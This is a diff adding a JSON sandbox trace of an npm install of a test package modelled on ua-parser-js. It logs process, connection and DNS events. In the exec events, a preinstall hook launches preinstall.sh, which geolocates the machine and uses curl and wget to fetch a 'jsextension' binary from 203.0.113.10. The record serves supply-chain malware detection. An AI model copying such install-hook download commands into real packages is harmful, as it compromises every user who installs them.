@@ -1,0 +1,151 @@
+{
+ "job_id": "45b5937b-4e95-4b20-94bd-fc280298d4ec",
+ "status": "completed",
+ "exit_code": 0,
+ "duration_s": 12.05,
+ "exec_events": [
+  {
+   "ts": "2026-11-01T16:01:53.681585722Z",
+   "pid": 55853,
+   "ppid": 55830,
+   "binary": "/usr/local/bin/docker-entrypoint.sh",
+   "args": "/usr/local/bin/docker-entrypoint.sh npm install --no-audit --no-fund --prefix payloads/r01-ua-parser-js",
+   "parent_binary": "/usr/bin/containerd-shim-runc-v2",
+   "uid": 10001,
+   "cwd": "/work"
+  },
+  {
+   "ts": "2026-11-01T16:01:53.684260837Z",
+   "pid": 55853,
+   "ppid": 55853,
+   "binary": "/usr/local/bin/npm",
+   "args": "node /usr/local/bin/npm install --no-audit --no-fund --prefix payloads/r01-ua-parser-js",
+   "parent_binary": "/usr/local/bin/docker-entrypoint.sh",
+   "uid": 10001,
+   "cwd": "/work"
+  },
+  {
+   "ts": "2026-11-01T16:01:53.685012770Z",
+   "pid": 55853,
+   "ppid": 55853,
+   "binary": "/usr/local/bin/node",
+   "args": "/usr/local/bin/npm install --no-audit --no-fund --prefix payloads/r01-ua-parser-js",
+   "parent_binary": "/usr/local/bin/npm",
+   "uid": 10001,
+   "cwd": "/work"
+  },
+  {
+   "ts": "2026-11-01T16:01:54.194488849Z",
+   "pid": 55910,
+   "ppid": 55853,
+   "binary": "/usr/bin/sh",
+   "args": "-c \"node preinstall.js\"",
+   "parent_binary": "/usr/local/bin/node",
+   "uid": 10001,
+   "cwd": "/work/payloads/r01-ua-parser-js/node_modules/ua-parser-js"
+  },
+  {
+   "ts": "2026-11-01T16:01:54.195415467Z",
+   "pid": 55911,
+   "ppid": 55910,
+   "binary": "/usr/local/bin/node",
+   "args": "preinstall.js",
+   "parent_binary": "/usr/bin/sh",
+   "uid": 10001,
+   "cwd": "/work/payloads/r01-ua-parser-js/node_modules/ua-parser-js"
+  },
+  {
+   "ts": "2026-11-01T16:01:54.234011189Z",
+   "pid": 55918,
+   "ppid": 55911,
+   "binary": "/bin/sh",
+   "args": "-c \"sh preinstall.sh\"",
+   "parent_binary": "/usr/local/bin/node",
+   "uid": 10001,
+   "cwd": "/work/payloads/r01-ua-parser-js/node_modules/ua-parser-js"
+  },
+  {
+   "ts": "2026-11-01T16:01:54.234948359Z",
+   "pid": 55919,
+   "ppid": 55918,
+   "binary": "/usr/bin/sh",
+   "args": "preinstall.sh",
+   "parent_binary": "/bin/sh",
+   "uid": 10001,
+   "cwd": "/work/payloads/r01-ua-parser-js/node_modules/ua-parser-js"
+  },
+  {
+   "ts": "2026-11-01T16:01:54.235955132Z",
+   "pid": 55920,
+   "ppid": 55919,
+   "binary": "/usr/bin/curl",
+   "args": "-s -m 3 https://ipinfo.io/country",
+   "parent_binary": "/usr/bin/sh",
+   "uid": 10001,
+   "cwd": "/work/payloads/r01-ua-parser-js/node_modules/ua-parser-js"
+  },
+  {
+   "ts": "2026-11-01T16:01:57.246529419Z",
+   "pid": 55922,
+   "ppid": 55919,
+   "binary": "/usr/bin/curl",
+   "args": "-s -m 3 http://203.0.113.10/download/jsextension -o jsextension",
+   "parent_binary": "/usr/bin/sh",
+   "uid": 10001,
+   "cwd": "/work/payloads/r01-ua-parser-js/node_modules/ua-parser-js"
+  },
+  {
+   "ts": "2026-11-01T16:02:00.256608633Z",
+   "pid": 55923,
+   "ppid": 55919,
+   "binary": "/usr/bin/wget",
+   "args": "-q -t 1 -T 3 http://203.0.113.10/download/jsextension -O jsextension",
+   "parent_binary": "/usr/bin/sh",
+   "uid": 10001,
+   "cwd": "/work/payloads/r01-ua-parser-js/node_modules/ua-parser-js"
+  }
+ ],
+ "connect_events": [
+  {
+   "ts": "2026-11-01T16:01:54.244412160Z",
+   "pid": 55920,
+   "binary": "/usr/bin/curl",
+   "daddr": "198.51.100.66",
+   "dport": 443,
+   "family": "AF_INET",
+   "resolved_domain": "ipinfo.io"
+  },
+  {
+   "ts": "2026-11-01T16:01:57.253577203Z",
+   "pid": 55922,
+   "binary": "/usr/bin/curl",
+   "daddr": "203.0.113.10",
+   "dport": 80,
+   "family": "AF_INET",
+   "resolved_domain": null
+  },
+  {
+   "ts": "2026-11-01T16:02:00.259531137Z",
+   "pid": 55923,
+   "binary": "/usr/bin/wget",
+   "daddr": "203.0.113.10",
+   "dport": 80,
+   "family": "AF_INET",
+   "resolved_domain": null
+  }
+ ],
+ "dns_queries": [
+  {
+   "ts": "2026-11-01T16:01:54Z",
+   "domain": "ipinfo.io",
+   "answers": [
+    "2001:db8::66",
+    "198.51.100.66"
+   ]
+  }
+ ],
+ "stdout_tail": "\nadded 1 package in 9s\n",
+ "stderr_tail": "",
+ "truncated": false,
+ "error": null
+}
